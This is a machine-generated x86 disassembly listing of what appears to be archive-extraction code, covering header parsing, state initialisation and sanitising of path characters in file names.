  4016c2:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4016c9:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4016cc:	eb 36                	jmp    0x401704
  4016ce:	8b 86 44 65 00 00    	mov    0x6544(%esi),%eax
  4016d4:	83 f8 03             	cmp    $0x3,%eax
  4016d7:	75 1f                	jne    0x4016f8
  4016d9:	38 9e 55 b0 00 00    	cmp    %bl,0xb055(%esi)
  4016df:	74 0d                	je     0x4016ee
  4016e1:	38 9e b0 99 00 00    	cmp    %bl,0x99b0(%esi)
  4016e7:	75 05                	jne    0x4016ee
  4016e9:	33 c0                	xor    %eax,%eax
  4016eb:	40                   	inc    %eax
  4016ec:	eb 02                	jmp    0x4016f0
  4016ee:	33 c0                	xor    %eax,%eax
  4016f0:	88 86 59 b0 00 00    	mov    %al,0xb059(%esi)
  4016f6:	eb 05                	jmp    0x4016fd
  4016f8:	83 f8 02             	cmp    $0x2,%eax
  4016fb:	74 14                	je     0x401711
  4016fd:	8b ce                	mov    %esi,%ecx
  4016ff:	e8 bc f9 ff ff       	call   0x4010c0
  401704:	8b ce                	mov    %esi,%ecx
  401706:	e8 50 1f 00 00       	call   0x40365b
  40170b:	85 c0                	test   %eax,%eax
  40170d:	75 bf                	jne    0x4016ce
  40170f:	eb 1d                	jmp    0x40172e
  401711:	38 9e 55 b0 00 00    	cmp    %bl,0xb055(%esi)
  401717:	74 0d                	je     0x401726
  401719:	38 9e 70 76 00 00    	cmp    %bl,0x7670(%esi)
  40171f:	75 05                	jne    0x401726
  401721:	33 c0                	xor    %eax,%eax
  401723:	40                   	inc    %eax
  401724:	eb 02                	jmp    0x401728
  401726:	33 c0                	xor    %eax,%eax
  401728:	88 86 59 b0 00 00    	mov    %al,0xb059(%esi)
  40172e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401731:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  401734:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  401738:	89 86 44 b0 00 00    	mov    %eax,0xb044(%esi)
  40173e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401741:	53                   	push   %ebx
  401742:	ff 75 d8             	push   -0x28(%ebp)
  401745:	89 86 48 b0 00 00    	mov    %eax,0xb048(%esi)
  40174b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40174e:	ff 75 d4             	push   -0x2c(%ebp)
  401751:	89 be 40 b0 00 00    	mov    %edi,0xb040(%esi)
  401757:	89 86 4c b0 00 00    	mov    %eax,0xb04c(%esi)
  40175d:	8b 01                	mov    (%ecx),%eax
  40175f:	ff 50 0c             	call   *0xc(%eax)
  401762:	38 9e 55 b0 00 00    	cmp    %bl,0xb055(%esi)
  401768:	74 08                	je     0x401772
  40176a:	38 9e 59 b0 00 00    	cmp    %bl,0xb059(%esi)
  401770:	74 12                	je     0x401784
  401772:	8d 46 1e             	lea    0x1e(%esi),%eax
  401775:	50                   	push   %eax
  401776:	81 c6 9a b0 00 00    	add    $0xb09a,%esi
  40177c:	56                   	push   %esi
  40177d:	e8 f5 8b 01 00       	call   0x41a377
  401782:	59                   	pop    %ecx
  401783:	59                   	pop    %ecx
  401784:	b0 01                	mov    $0x1,%al
  401786:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401789:	5f                   	pop    %edi
  40178a:	5e                   	pop    %esi
  40178b:	5b                   	pop    %ebx
  40178c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401793:	c9                   	leave
  401794:	c2 04 00             	ret    $0x4
  401797:	b8 c5 92 42 00       	mov    $0x4292c5,%eax
  40179c:	e8 bb 88 01 00       	call   0x41a05c
  4017a1:	83 ec 10             	sub    $0x10,%esp
  4017a4:	53                   	push   %ebx
  4017a5:	56                   	push   %esi
  4017a6:	8b f1                	mov    %ecx,%esi
  4017a8:	33 db                	xor    %ebx,%ebx
  4017aa:	38 9e 56 b0 00 00    	cmp    %bl,0xb056(%esi)
  4017b0:	75 07                	jne    0x4017b9
  4017b2:	32 c0                	xor    %al,%al
  4017b4:	e9 88 00 00 00       	jmp    0x401841
  4017b9:	56                   	push   %esi
  4017ba:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4017bd:	e8 b9 f9 ff ff       	call   0x40117b
  4017c2:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4017c5:	38 9e 8c 65 00 00    	cmp    %bl,0x658c(%esi)
  4017cb:	74 26                	je     0x4017f3
  4017cd:	8b 8e 60 b0 00 00    	mov    0xb060(%esi),%ecx
  4017d3:	8b 06                	mov    (%esi),%eax
  4017d5:	53                   	push   %ebx
  4017d6:	83 c1 14             	add    $0x14,%ecx
  4017d9:	53                   	push   %ebx
  4017da:	51                   	push   %ecx
  4017db:	8b ce                	mov    %esi,%ecx
  4017dd:	ff 50 0c             	call   *0xc(%eax)
  4017e0:	8b ce                	mov    %esi,%ecx
  4017e2:	e8 74 1e 00 00       	call   0x40365b
  4017e7:	8b 45 08             	mov    0x8(%ebp),%eax
  4017ea:	39 58 04             	cmp    %ebx,0x4(%eax)
  4017ed:	0f 97 45 0b          	seta   0xb(%ebp)
  4017f1:	eb 38                	jmp    0x40182b
  4017f3:	57                   	push   %edi
  4017f4:	8b 3e                	mov    (%esi),%edi
  4017f6:	53                   	push   %ebx
  4017f7:	8b ce                	mov    %esi,%ecx
  4017f9:	e8 3c 03 00 00       	call   0x401b3a
  4017fe:	52                   	push   %edx
  4017ff:	50                   	push   %eax
  401800:	8b ce                	mov    %esi,%ecx
  401802:	ff 57 0c             	call   *0xc(%edi)
  401805:	68 7c a4 42 00       	push   $0x42a47c
  40180a:	8b ce                	mov    %esi,%ecx
  40180c:	e8 12 1f 00 00       	call   0x403723
  401811:	5f                   	pop    %edi
  401812:	85 c0                	test   %eax,%eax
  401814:	74 12                	je     0x401828
  401816:	ff 75 08             	push   0x8(%ebp)
  401819:	8b ce                	mov    %esi,%ecx
  40181b:	e8 12 fb ff ff       	call   0x401332
  401820:	c6 45 0b 01          	movb   $0x1,0xb(%ebp)
  401824:	84 c0                	test   %al,%al
  401826:	75 03                	jne    0x40182b
  401828:	88 5d 0b             	mov    %bl,0xb(%ebp)
  40182b:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40182e:	8b 01                	mov    (%ecx),%eax
  401830:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  401834:	53                   	push   %ebx
  401835:	ff 75 f0             	push   -0x10(%ebp)
  401838:	ff 75 ec             	push   -0x14(%ebp)
  40183b:	ff 50 0c             	call   *0xc(%eax)
  40183e:	8a 45 0b             	mov    0xb(%ebp),%al
  401841:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401844:	5e                   	pop    %esi
  401845:	5b                   	pop    %ebx
  401846:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40184d:	c9                   	leave
  40184e:	c2 04 00             	ret    $0x4
  401851:	b8 08 91 42 00       	mov    $0x429108,%eax
  401856:	e8 01 88 01 00       	call   0x41a05c
  40185b:	51                   	push   %ecx
  40185c:	53                   	push   %ebx
  40185d:	56                   	push   %esi
  40185e:	8b f1                	mov    %ecx,%esi
  401860:	89 75 f0             	mov    %esi,-0x10(%ebp)
  401863:	e8 b6 6c 00 00       	call   0x40851e
  401868:	33 db                	xor    %ebx,%ebx
  40186a:	8d 8e 24 10 00 00    	lea    0x1024(%esi),%ecx
  401870:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401873:	c7 06 68 a4 42 00    	movl   $0x42a468,(%esi)
  401879:	e8 5b 46 00 00       	call   0x405ed9
  40187e:	8d 8e e8 20 00 00    	lea    0x20e8(%esi),%ecx
  401884:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  401888:	e8 65 9d 00 00       	call   0x40b5f2
  40188d:	8d 8e e8 65 00 00    	lea    0x65e8(%esi),%ecx
  401893:	89 9e 38 65 00 00    	mov    %ebx,0x6538(%esi)
  401899:	89 9e 3c 65 00 00    	mov    %ebx,0x653c(%esi)
  40189f:	e8 81 fb ff ff       	call   0x401425
  4018a4:	8d 8e 28 89 00 00    	lea    0x8928(%esi),%ecx
  4018aa:	e8 76 fb ff ff       	call   0x401425
  4018af:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4018b2:	c6 45 fc 04          	movb   $0x4,-0x4(%ebp)
  4018b6:	0f 94 c0             	sete   %al
  4018b9:	89 9e 24 65 00 00    	mov    %ebx,0x6524(%esi)
  4018bf:	88 86 20 65 00 00    	mov    %al,0x6520(%esi)
  4018c5:	3a c3                	cmp    %bl,%al
  4018c7:	74 23                	je     0x4018ec
  4018c9:	68 a8 72 00 00       	push   $0x72a8
  4018ce:	e8 47 8b 01 00       	call   0x41a41a
  4018d3:	59                   	pop    %ecx
  4018d4:	8b c8                	mov    %eax,%ecx
  4018d6:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4018d9:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  4018dd:	3b cb                	cmp    %ebx,%ecx
  4018df:	74 07                	je     0x4018e8
  4018e1:	e8 c8 84 00 00       	call   0x409dae
  4018e6:	eb 07                	jmp    0x4018ef
  4018e8:	33 c0                	xor    %eax,%eax
  4018ea:	eb 03                	jmp    0x4018ef
  4018ec:	8b 45 08             	mov    0x8(%ebp),%eax
  4018ef:	89 86 24 65 00 00    	mov    %eax,0x6524(%esi)
  4018f5:	8a 80 95 51 00 00    	mov    0x5195(%eax),%al
  4018fb:	83 8e 28 65 00 00 ff 	orl    $0xffffffff,0x6528(%esi)
  401902:	83 8e 2c 65 00 00 ff 	orl    $0xffffffff,0x652c(%esi)
  401909:	83 8e 30 65 00 00 ff 	orl    $0xffffffff,0x6530(%esi)
  401910:	6a 40                	push   $0x40
  401912:	88 46 1c             	mov    %al,0x1c(%esi)
  401915:	8d 86 70 65 00 00    	lea    0x6570(%esi),%eax
  40191b:	53                   	push   %ebx
  40191c:	50                   	push   %eax
  40191d:	c7 86 50 b0 00 00 02 	movl   $0x2,0xb050(%esi)
  401924:	00 00 00 
  401927:	88 9e 54 b0 00 00    	mov    %bl,0xb054(%esi)
  40192d:	88 9e 55 b0 00 00    	mov    %bl,0xb055(%esi)
  401933:	88 9e 56 b0 00 00    	mov    %bl,0xb056(%esi)
  401939:	88 9e 57 b0 00 00    	mov    %bl,0xb057(%esi)
  40193f:	88 9e 58 b0 00 00    	mov    %bl,0xb058(%esi)
  401945:	88 9e 59 b0 00 00    	mov    %bl,0xb059(%esi)
  40194b:	88 9e 5a b0 00 00    	mov    %bl,0xb05a(%esi)
  401951:	89 9e 60 b0 00 00    	mov    %ebx,0xb060(%esi)
  401957:	89 9e 38 65 00 00    	mov    %ebx,0x6538(%esi)
  40195d:	89 9e 3c 65 00 00    	mov    %ebx,0x653c(%esi)
  401963:	88 9e 5b b0 00 00    	mov    %bl,0xb05b(%esi)
  401969:	88 9e 5c b0 00 00    	mov    %bl,0xb05c(%esi)
  40196f:	88 9e 65 b0 00 00    	mov    %bl,0xb065(%esi)
  401975:	88 9e 64 b0 00 00    	mov    %bl,0xb064(%esi)
  40197b:	89 9e 40 65 00 00    	mov    %ebx,0x6540(%esi)
  401981:	89 9e 40 b0 00 00    	mov    %ebx,0xb040(%esi)
  401987:	89 9e 44 b0 00 00    	mov    %ebx,0xb044(%esi)
  40198d:	89 9e 48 b0 00 00    	mov    %ebx,0xb048(%esi)
  401993:	89 9e 4c b0 00 00    	mov    %ebx,0xb04c(%esi)
  401999:	e8 02 8a 01 00       	call   0x41a3a0
  40199e:	6a 34                	push   $0x34
  4019a0:	8d 86 b0 65 00 00    	lea    0x65b0(%esi),%eax
  4019a6:	53                   	push   %ebx
  4019a7:	50                   	push   %eax
  4019a8:	e8 f3 89 01 00       	call   0x41a3a0
  4019ad:	6a 20                	push   $0x20
  4019af:	8d 86 e8 88 00 00    	lea    0x88e8(%esi),%eax
  4019b5:	53                   	push   %ebx
  4019b6:	50                   	push   %eax
  4019b7:	e8 e4 89 01 00       	call   0x41a3a0
  4019bc:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4019bf:	83 c4 24             	add    $0x24,%esp
  4019c2:	33 c0                	xor    %eax,%eax
  4019c4:	66 89 86 9a b0 00 00 	mov    %ax,0xb09a(%esi)
  4019cb:	89 9e 78 b0 00 00    	mov    %ebx,0xb078(%esi)
  4019d1:	89 9e 80 b0 00 00    	mov    %ebx,0xb080(%esi)
  4019d7:	89 9e 84 b0 00 00    	mov    %ebx,0xb084(%esi)
  4019dd:	89 9e 88 b0 00 00    	mov    %ebx,0xb088(%esi)
  4019e3:	89 9e 8c b0 00 00    	mov    %ebx,0xb08c(%esi)
  4019e9:	89 9e 90 b0 00 00    	mov    %ebx,0xb090(%esi)
  4019ef:	89 9e 94 b0 00 00    	mov    %ebx,0xb094(%esi)
  4019f5:	88 9e 76 b0 00 00    	mov    %bl,0xb076(%esi)
  4019fb:	88 9e 98 b0 00 00    	mov    %bl,0xb098(%esi)
  401a01:	88 9e 48 65 00 00    	mov    %bl,0x6548(%esi)
  401a07:	8b c6                	mov    %esi,%eax
  401a09:	5e                   	pop    %esi
  401a0a:	5b                   	pop    %ebx
  401a0b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401a12:	c9                   	leave
  401a13:	c2 04 00             	ret    $0x4
  401a16:	56                   	push   %esi
  401a17:	ff 74 24 08          	push   0x8(%esp)
  401a1b:	8b f1                	mov    %ecx,%esi
  401a1d:	e8 3d fa ff ff       	call   0x40145f
  401a22:	84 c0                	test   %al,%al
  401a24:	75 1f                	jne    0x401a45
  401a26:	38 86 65 b0 00 00    	cmp    %al,0xb065(%esi)
  401a2c:	75 0b                	jne    0x401a39
  401a2e:	83 c6 1e             	add    $0x1e,%esi
  401a31:	56                   	push   %esi
  401a32:	6a 38                	push   $0x38
  401a34:	e8 97 f8 ff ff       	call   0x4012d0
  401a39:	6a 02                	push   $0x2
  401a3b:	b9 ac 25 43 00       	mov    $0x4325ac,%ecx
  401a40:	e8 b3 48 00 00       	call   0x4062f8
  401a45:	5e                   	pop    %esi
  401a46:	c2 04 00             	ret    $0x4
  401a49:	56                   	push   %esi
  401a4a:	ff 74 24 08          	push   0x8(%esp)
  401a4e:	8b f1                	mov    %ecx,%esi
  401a50:	e8 40 6c 00 00       	call   0x408695
  401a55:	84 c0                	test   %al,%al
  401a57:	75 04                	jne    0x401a5d
  401a59:	32 c0                	xor    %al,%al
  401a5b:	eb 23                	jmp    0x401a80
  401a5d:	6a 00                	push   $0x0
  401a5f:	8b ce                	mov    %esi,%ecx
  401a61:	e8 f9 f9 ff ff       	call   0x40145f
  401a66:	84 c0                	test   %al,%al
  401a68:	75 14                	jne    0x401a7e
  401a6a:	8d 46 1e             	lea    0x1e(%esi),%eax
  401a6d:	50                   	push   %eax
  401a6e:	6a 38                	push   $0x38
  401a70:	e8 5b f8 ff ff       	call   0x4012d0
  401a75:	8b ce                	mov    %esi,%ecx
  401a77:	e8 4e 6d 00 00       	call   0x4087ca
  401a7c:	eb db                	jmp    0x401a59
  401a7e:	b0 01                	mov    $0x1,%al
  401a80:	5e                   	pop    %esi
  401a81:	c2 04 00             	ret    $0x4
  401a84:	8a 81 c9 76 00 00    	mov    0x76c9(%ecx),%al
  401a8a:	c3                   	ret
  401a8b:	83 b9 d4 76 00 00 00 	cmpl   $0x0,0x76d4(%ecx)
  401a92:	74 18                	je     0x401aac
  401a94:	33 c0                	xor    %eax,%eax
  401a96:	38 81 c9 76 00 00    	cmp    %al,0x76c9(%ecx)
  401a9c:	0f 94 c0             	sete   %al
  401a9f:	48                   	dec    %eax
  401aa0:	83 e0 f0             	and    $0xfffffff0,%eax
  401aa3:	83 c0 20             	add    $0x20,%eax
  401aa6:	89 81 04 66 00 00    	mov    %eax,0x6604(%ecx)
  401aac:	c3                   	ret
  401aad:	83 b9 50 b0 00 00 02 	cmpl   $0x2,0xb050(%ecx)
  401ab4:	8b 44 24 04          	mov    0x4(%esp),%eax
  401ab8:	75 13                	jne    0x401acd
  401aba:	80 78 19 14          	cmpb   $0x14,0x19(%eax)
  401abe:	73 0d                	jae    0x401acd
  401ac0:	f6 40 1c 10          	testb  $0x10,0x1c(%eax)
  401ac4:	74 07                	je     0x401acd
  401ac6:	c6 80 e1 10 00 00 01 	movb   $0x1,0x10e1(%eax)
  401acd:	83 b8 ec 10 00 00 02 	cmpl   $0x2,0x10ec(%eax)
  401ad4:	75 15                	jne    0x401aeb
  401ad6:	33 d2                	xor    %edx,%edx
  401ad8:	38 90 e1 10 00 00    	cmp    %dl,0x10e1(%eax)
  401ade:	0f 94 c2             	sete   %dl
  401ae1:	4a                   	dec    %edx
  401ae2:	83 e2 f0             	and    $0xfffffff0,%edx
  401ae5:	83 c2 20             	add    $0x20,%edx
  401ae8:	89 50 1c             	mov    %edx,0x1c(%eax)
  401aeb:	83 c0 20             	add    $0x20,%eax
  401aee:	eb 41                	jmp    0x401b31
  401af0:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  401af4:	75 0f                	jne    0x401b05
  401af6:	83 b9 50 b0 00 00 03 	cmpl   $0x3,0xb050(%ecx)
  401afd:	75 06                	jne    0x401b05
  401aff:	6a 5f                	push   $0x5f
  401b01:	5a                   	pop    %edx
  401b02:	66 89 10             	mov    %dx,(%eax)
  401b05:	66 83 38 3a          	cmpw   $0x3a,(%eax)
  401b09:	75 06                	jne    0x401b11
  401b0b:	6a 5f                	push   $0x5f
  401b0d:	5a                   	pop    %edx
  401b0e:	66 89 10             	mov    %dx,(%eax)
  401b11:	0f b7 10             	movzwl (%eax),%edx
  401b14:	66 83 fa 2f          	cmp    $0x2f,%dx
  401b18:	74 0f                	je     0x401b29
  401b1a:	66 83 fa 5c          	cmp    $0x5c,%dx
  401b1e:	75 0f                	jne    0x401b2f
  401b20:	83 b9 50 b0 00 00 03 	cmpl   $0x3,0xb050(%ecx)
  401b27:	74 06                	je     0x401b2f
  401b29:	6a 5c                	push   $0x5c
  401b2b:	5a                   	pop    %edx
  401b2c:	66 89 10             	mov    %dx,(%eax)
  401b2f:	40                   	inc    %eax
  401b30:	40                   	inc    %eax
  401b31:	66 83 38 00          	cmpw   $0x0,(%eax)
  401b35:	75 b9                	jne    0x401af0
  401b37:	c2 04 00             	ret    $0x4
  401b3a:	53                   	push   %ebx
  401b3b:	56                   	push   %esi
  401b3c:	8b f1                	mov    %ecx,%esi
  401b3e:	57                   	push   %edi
  401b3f:	8b be 68 65 00 00    	mov    0x6568(%esi),%edi
  401b45:	03 be 60 b0 00 00    	add    0xb060(%esi),%edi
  401b4b:	33 db                	xor    %ebx,%ebx
  401b4d:	83 be 50 b0 00 00 02 	cmpl   $0x2,0xb050(%esi)
  401b54:	75 08                	jne    0x401b5e
  401b56:	8b 86 7c 65 00 00    	mov    0x657c(%esi),%eax
  401b5c:	eb 11                	jmp    0x401b6f
  401b5e:	ff b6 7c 65 00 00    	push   0x657c(%esi)
  401b64:	e8 6b f5 ff ff       	call   0x4010d4
  401b69:	03 86 bc 65 00 00    	add    0x65bc(%esi),%eax
  401b6f:	03 f8                	add    %eax,%edi
  401b71:	8b c7                	mov    %edi,%eax
  401b73:	5f                   	pop    %edi
  401b74:	13 db                	adc    %ebx,%ebx
  401b76:	5e                   	pop    %esi
  401b77:	8b d3                	mov    %ebx,%edx
  401b79:	5b                   	pop    %ebx
  401b7a:	c3                   	ret
  401b7b:	8d 44 24 10          	lea    0x10(%esp),%eax
  401b7f:	50                   	push   %eax
  401b80:	6a 00                	push   $0x0
  401b82:	ff 74 24 14          	push   0x14(%esp)
  401b86:	ff 74 24 14          	push   0x14(%esp)
  401b8a:	ff 74 24 14          	push   0x14(%esp)
  401b8e:	e8 e4 89 01 00       	call   0x41a577
  401b93:	83 c4 14             	add    $0x14,%esp
  401b96:	c3                   	ret
  401b97:	ff 74 24 04          	push   0x4(%esp)
  401b9b:	83 c1 20             	add    $0x20,%ecx
  401b9e:	51                   	push   %ecx
  401b9f:	e8 fd 89 01 00       	call   0x41a5a1
  401ba4:	f7 d8                	neg    %eax
  401ba6:	59                   	pop    %ecx
  401ba7:	1b c0                	sbb    %eax,%eax
  401ba9:	59                   	pop    %ecx
  401baa:	40                   	inc    %eax
  401bab:	c2 04 00             	ret    $0x4
  401bae:	55                   	push   %ebp
  401baf:	8b ec                	mov    %esp,%ebp
  401bb1:	83 ec 4c             	sub    $0x4c,%esp
  401bb4:	8b 45 08             	mov    0x8(%ebp),%eax
  401bb7:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401bbb:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  401bbf:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  401bc2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401bc5:	e8 f6 f6 00 00       	call   0x4112c0
  401bca:	c9                   	leave
  401bcb:	c2 04 00             	ret    $0x4
  401bce:	56                   	push   %esi
  401bcf:	8b f1                	mov    %ecx,%esi
  401bd1:	8b 86 24 65 00 00    	mov    0x6524(%esi),%eax
  401bd7:	80 b8 20 41 00 00 00 	cmpb   $0x0,0x4120(%eax)
  401bde:	75 3f                	jne    0x401c1f
  401be0:	05 20 40 00 00       	add    $0x4020,%eax
  401be5:	50                   	push   %eax
  401be6:	8d 46 1e             	lea    0x1e(%esi),%eax
  401be9:	50                   	push   %eax
  401bea:	6a 02                	push   $0x2
  401bec:	e8 27 f9 00 00       	call   0x411518
  401bf1:	84 c0                	test   %al,%al
  401bf3:	75 1d                	jne    0x401c12
  401bf5:	8b ce                	mov    %esi,%ecx
  401bf7:	e8 ce 6b 00 00       	call   0x4087ca
  401bfc:	6a 02                	push   $0x2
  401bfe:	e8 ab ff ff ff       	call   0x401bae
  401c03:	68 ff 00 00 00       	push   $0xff
  401c08:	b9 ac 25 43 00       	mov    $0x4325ac,%ecx
  401c0d:	e8 e6 46 00 00       	call   0x4062f8
  401c12:	8b 86 24 65 00 00    	mov    0x6524(%esi),%eax
  401c18:	c6 80 23 41 00 00 01 	movb   $0x1,0x4123(%eax)
  401c1f:	5e                   	pop    %esi
  401c20:	c3                   	ret
  401c21:	8b 44 24 04          	mov    0x4(%esp),%eax
  401c25:	3b 41 08             	cmp    0x8(%ecx),%eax
  401c28:	76 0b                	jbe    0x401c35
  401c2a:	2b 41 04             	sub    0x4(%ecx),%eax
  401c2d:	50                   	push   %eax
  401c2e:	e8 d3 f4 ff ff       	call   0x401106
  401c33:	eb 03                	jmp    0x401c38
  401c35:	89 41 04             	mov    %eax,0x4(%ecx)
  401c38:	c2 04 00             	ret    $0x4
  401c3b:	56                   	push   %esi
  401c3c:	8b f1                	mov    %ecx,%esi
  401c3e:	e8 48 6f 00 00       	call   0x408b8b
  401c43:	8b 8e 40 b0 00 00    	mov    0xb040(%esi),%ecx
  401c49:	3b c8                	cmp    %eax,%ecx
  401c4b:	75 1e                	jne    0x401c6b
  401c4d:	8b 8e 44 b0 00 00    	mov    0xb044(%esi),%ecx
  401c53:	3b ca                	cmp    %edx,%ecx
  401c55:	75 14                	jne    0x401c6b
  401c57:	8b 8e 48 b0 00 00    	mov    0xb048(%esi),%ecx
  401c5d:	3b c8                	cmp    %eax,%ecx
  401c5f:	75 0a                	jne    0x401c6b
  401c61:	8b 86 4c b0 00 00    	mov    0xb04c(%esi),%eax
  401c67:	3b c2                	cmp    %edx,%eax
  401c69:	74 17                	je     0x401c82
  401c6b:	83 c6 1e             	add    $0x1e,%esi
  401c6e:	56                   	push   %esi
  401c6f:	6a 37                	push   $0x37
  401c71:	e8 5a f6 ff ff       	call   0x4012d0
  401c76:	6a 01                	push   $0x1
  401c78:	b9 ac 25 43 00       	mov    $0x4325ac,%ecx
  401c7d:	e8 d5 45 00 00       	call   0x406257
  401c82:	5e                   	pop    %esi
  401c83:	c3                   	ret
  401c84:	56                   	push   %esi
  401c85:	8b f1                	mov    %ecx,%esi
  401c87:	8d 46 1e             	lea    0x1e(%esi),%eax
  401c8a:	50                   	push   %eax
  401c8b:	6a 18                	push   $0x18
  401c8d:	e8 3e f6 ff ff       	call   0x4012d0
  401c92:	6a 03                	push   $0x3
  401c94:	b9 ac 25 43 00       	mov    $0x4325ac,%ecx
  401c99:	c6 86 64 b0 00 00 01 	movb   $0x1,0xb064(%esi)
  401ca0:	e8 b2 45 00 00       	call   0x406257
  401ca5:	5e                   	pop    %esi
  401ca6:	c3                   	ret
  401ca7:	ff 74 24 04          	push   0x4(%esp)
  401cab:	83 c1 1e             	add    $0x1e,%ecx
  401cae:	51                   	push   %ecx
  401caf:	6a 20                	push   $0x20
  401cb1:	e8 47 46 00 00       	call   0x4062fd
  401cb6:	6a 01                	push   $0x1
  401cb8:	b9 ac 25 43 00       	mov    $0x4325ac,%ecx
  401cbd:	e8 95 45 00 00       	call   0x406257
  401cc2:	c2 04 00             	ret    $0x4
  401cc5:	b8 22 91 42 00       	mov    $0x429122,%eax
  401cca:	e8 8d 83 01 00       	call   0x41a05c
  401ccf:	b8 74 28 00 00       	mov    $0x2874,%eax
  401cd4:	e8 97 89 01 00       	call   0x41a670
  401cd9:	53                   	push   %ebx
  401cda:	56                   	push   %esi
  401cdb:	8b d9                	mov    %ecx,%ebx
  401cdd:	57                   	push   %edi
  401cde:	53                   	push   %ebx
  401cdf:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  401ce2:	e8 5e 97 00 00       	call   0x40b445
  401ce7:	33 ff                	xor    %edi,%edi
  401ce9:	80 bb 5c b0 00 00 00 	cmpb   $0x0,0xb05c(%ebx)
  401cf0:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401cf3:	74 5c                	je     0x401d51
  401cf5:	8b 83 60 b0 00 00    	mov    0xb060(%ebx),%eax
  401cfb:	8b 93 44 b0 00 00    	mov    0xb044(%ebx),%edx
  401d01:	33 c9                	xor    %ecx,%ecx
  401d03:	83 c0 07             	add    $0x7,%eax
  401d06:	13 cf                	adc    %edi,%ecx
  401d08:	3b d1                	cmp    %ecx,%edx
  401d0a:	7c 45                	jl     0x401d51
  401d0c:	7f 0a                	jg     0x401d18
  401d0e:	8b 8b 40 b0 00 00    	mov    0xb040(%ebx),%ecx
  401d14:	3b c8                	cmp    %eax,%ecx
  401d16:	76 39                	jbe    0x401d51
  401d18:	8b cb                	mov    %ebx,%ecx
  401d1a:	c6 45 f2 01          	movb   $0x1,-0xe(%ebp)
  401d1e:	e8 ab fe ff ff       	call   0x401bce
  401d23:	8b 03                	mov    (%ebx),%eax
  401d25:	6a 08                	push   $0x8
  401d27:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  401d2a:	51                   	push   %ecx
  401d2b:	8b cb                	mov    %ebx,%ecx
  401d2d:	ff 50 08             	call   *0x8(%eax)
  401d30:	83 f8 08             	cmp    $0x8,%eax
  401d33:	74 22                	je     0x401d57
  401d35:	8b cb                	mov    %ebx,%ecx
  401d37:	e8 ff fe ff ff       	call   0x401c3b
  401d3c:	39 7d b8             	cmp    %edi,-0x48(%ebp)
  401d3f:	74 09                	je     0x401d4a
  401d41:	ff 75 b8             	push   -0x48(%ebp)
  401d44:	e8 3d 83 01 00       	call   0x41a086
  401d49:	59                   	pop    %ecx
  401d4a:	33 c0                	xor    %eax,%eax
  401d4c:	e9 d2 09 00 00       	jmp    0x402723
  401d51:	c6 45 f2 00          	movb   $0x0,-0xe(%ebp)
  401d55:	eb 27                	jmp    0x401d7e
  401d57:	57                   	push   %edi
  401d58:	57                   	push   %edi
  401d59:	57                   	push   %edi
  401d5a:	57                   	push   %edi
  401d5b:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401d5e:	50                   	push   %eax
  401d5f:	8b 83 24 65 00 00    	mov    0x6524(%ebx),%eax
  401d65:	05 20 40 00 00       	add    $0x4020,%eax
  401d6a:	50                   	push   %eax
  401d6b:	6a 04                	push   $0x4
  401d6d:	8d b3 24 10 00 00    	lea    0x1024(%ebx),%esi
  401d73:	57                   	push   %edi
  401d74:	8b ce                	mov    %esi,%ecx
  401d76:	e8 09 42 00 00       	call   0x405f84
  401d7b:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  401d7e:	6a 07                	push   $0x7
  401d80:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  401d83:	e8 4f 94 00 00       	call   0x40b1d7
  401d88:	39 7d cc             	cmp    %edi,-0x34(%ebp)
  401d8b:	74 a8                	je     0x401d35
  401d8d:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  401d90:	e8 f4 94 00 00       	call   0x40b289
  401d95:	0f b7 c0             	movzwl %ax,%eax
  401d98:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  401d9b:	89 83 4c 65 00 00    	mov    %eax,0x654c(%ebx)
  401da1:	c6 83 5c 65 00 00 00 	movb   $0x0,0x655c(%ebx)
  401da8:	e8 c4 94 00 00       	call   0x40b271
  401dad:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  401db0:	0f b6 f0             	movzbl %al,%esi
  401db3:	e8 d1 94 00 00       	call   0x40b289
  401db8:	0f b7 c0             	movzwl %ax,%eax
  401dbb:	89 83 54 65 00 00    	mov    %eax,0x6554(%ebx)
  401dc1:	c1 e8 0e             	shr    $0xe,%eax
  401dc4:	24 01                	and    $0x1,%al
  401dc6:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  401dc9:	88 83 5c 65 00 00    	mov    %al,0x655c(%ebx)
  401dcf:	e8 b5 94 00 00       	call   0x40b289
  401dd4:	0f b7 c0             	movzwl %ax,%eax
  401dd7:	89 83 58 65 00 00    	mov    %eax,0x6558(%ebx)
  401ddd:	89 b3 50 65 00 00    	mov    %esi,0x6550(%ebx)
  401de3:	83 f8 07             	cmp    $0x7,%eax
